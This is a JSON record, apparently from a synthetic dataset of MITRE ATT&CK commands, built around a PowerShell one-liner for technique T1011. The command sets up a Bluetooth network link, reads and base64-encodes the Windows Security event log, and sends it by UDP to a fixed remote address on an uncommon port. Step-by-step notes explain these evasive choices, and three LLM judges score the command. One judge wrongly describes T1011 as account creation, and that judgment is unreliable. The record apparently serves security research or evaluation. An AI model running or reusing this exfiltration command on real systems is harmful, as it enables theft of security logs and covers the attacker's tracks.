{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
  "rationale_steps": [
    "Connect to Bluetooth NAP to establish the alternate medium.",
    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
    "Send base64 data to a high-numbered, uncommon UDP port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and object creation with no syntax errors.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements the exfiltration over alternative protocol technique (T1011) by establishing a Bluetooth PAN connection, configuring a static IP, encoding the Windows Security event log as base64, and transmitting it via UDP to a specific destination IP and port.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T09:47:45.884504Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax, balanced elements, valid command chaining, and proper argument formatting for both native and external commands.",
        "semantic_score": 1,
        "semantic_justification": "While the command technically performs Bluetooth network configuration and data exfiltration as described, these actions are entirely unrelated to the MITRE ATT&CK technique T1011 (Establish Accounts), which involves creating or abusing user accounts.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T09:48:09.014403Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes, valid separators, and correct use of cmdlets and .NET constructors.",
        "semantic_score": 3,
        "semantic_justification": "While it outlines a plausible Bluetooth PAN setup and UDP exfiltration flow, it likely fails in practice due to questionable BluetoothCL connect semantics, required admin privileges for netsh and reading Security.evtx, and attempting to send an oversized single UDP datagram.",
        "combined_score": 4.0,
        "confidence": 0.6,
        "timestamp": "2025-10-02T09:48:29.007421Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.0,
    "llm_average_score": 4.0,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}